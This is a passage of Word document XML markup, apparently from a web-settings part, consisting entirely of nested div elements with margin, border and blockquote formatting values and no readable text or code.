                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="691342391">
                      <w:marLeft w:val="0"/>
                      <w:marRight w:val="0"/>
                      <w:marTop w:val="0"/>
                      <w:marBottom w:val="120"/>
                      <w:divBdr>
                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                      </w:divBdr>
                      <w:divsChild>
                        <w:div w:id="18521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17571">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="1754859752">
                      <w:marLeft w:val="0"/>
                      <w:marRight w:val="0"/>
                      <w:marTop w:val="0"/>
                      <w:marBottom w:val="0"/>
                      <w:divBdr>
                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:bottom w:val="single" w:sz="6" w:space="0" w:color="F5F6F7"/>
                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                      </w:divBdr>
                      <w:divsChild>
                        <w:div w:id="1003892829">
                          <w:marLeft w:val="0"/>
                          <w:marRight w:val="0"/>
                          <w:marTop w:val="0"/>
                          <w:marBottom w:val="0"/>
                          <w:divBdr>
                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                          </w:divBdr>
                          <w:divsChild>
                            <w:div w:id="1672951887">
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="120"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="438061326">
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="0"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                              <w:divsChild>
                                <w:div w:id="2099448481">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="0"/>
                                  <w:divBdr>
                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                  </w:divBdr>
                                  <w:divsChild>
                                    <w:div w:id="1043598090">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                    </w:div>
                                  </w:divsChild>
                                </w:div>
                                <w:div w:id="1103384542">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="0"/>
                                  <w:divBdr>
                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                  </w:divBdr>
                                  <w:divsChild>
                                    <w:div w:id="1378434628">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="120"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="60"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                    </w:div>
                                  </w:divsChild>
                                </w:div>
                                <w:div w:id="19439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14846">
                      <w:marLeft w:val="0"/>
                      <w:marRight w:val="0"/>
                      <w:marTop w:val="0"/>
                      <w:marBottom w:val="0"/>
                      <w:divBdr>
                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                      </w:divBdr>
                      <w:divsChild>
                        <w:div w:id="1963874489">
                          <w:marLeft w:val="0"/>
                          <w:marRight w:val="0"/>
                          <w:marTop w:val="0"/>
                          <w:marBottom w:val="0"/>
                          <w:divBdr>
                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                          </w:divBdr>
                          <w:divsChild>
                            <w:div w:id="1198810788">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1491479178">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="122038609">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="319506503">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1516336979">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1678190553">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="868838222">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="967272587">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1090736221">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="435102508">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1798991036">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="401756834">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="948896479">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1067800005">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="2064911323">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1281110512">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1822963731">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="2016108895">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="450980277">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="781338578">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1498494237">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="949438748">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1507480417">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1323312359">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1434787303">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="762801878">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1097018228">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="581112102">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1552885324">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1115448322">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1228228138">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1503084337">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1189216944">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="736515898">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="2010862412">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="621116227">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="195653872">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1411854697">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="578446639">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1709211192">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="1585214206">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="single" w:sz="48" w:space="12" w:color="DDDFE4"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                            </w:div>
                            <w:div w:id="917910980">
                              <w:blockQuote w:val="1"/>
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="360"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
